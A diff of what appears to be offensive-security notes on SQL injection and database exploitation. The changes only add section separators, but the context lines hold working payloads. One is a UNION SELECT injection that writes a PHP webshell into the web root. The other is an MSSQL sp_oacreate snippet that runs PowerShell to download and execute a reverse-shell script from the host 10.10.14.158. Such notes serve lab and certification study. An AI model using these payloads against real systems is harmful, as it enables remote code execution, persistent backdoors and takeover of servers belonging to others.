@@ -37,6 +37,7 @@ Command shows us selecting both the `user` and the `authentication_string` from 
 Inject a webshell into a file you can navigate to:
 `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
 
+---
 ## MSSQL
 For Windows, there is a built in command named `SQLCMD` that can be used to run Windows through the command prompt or remotely from another machine. Kali uses `impacket-mssqlclient`. When using an SQL Server command line tool like sqlcmd, we must submit our SQL statement ending with a semicolon followed by _GO_ on a separate line. However, when running the command remotely, we can omit the GO statement since it's not part of the MSSQL TDS protocol.
 
@@ -91,6 +92,7 @@ DECLARE @ole INT;
 EXEC sp_oacreate 'WScript.Shell', @ole OUT;
 EXEC sp_oamethod @ole, 'Run', NULL, 'cmd /c powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.158/revshell.ps1'')"';
 ```
+---
 ## PostgreSQL
 **Note:** Press `q` to exit long pages.
 ###### Connect
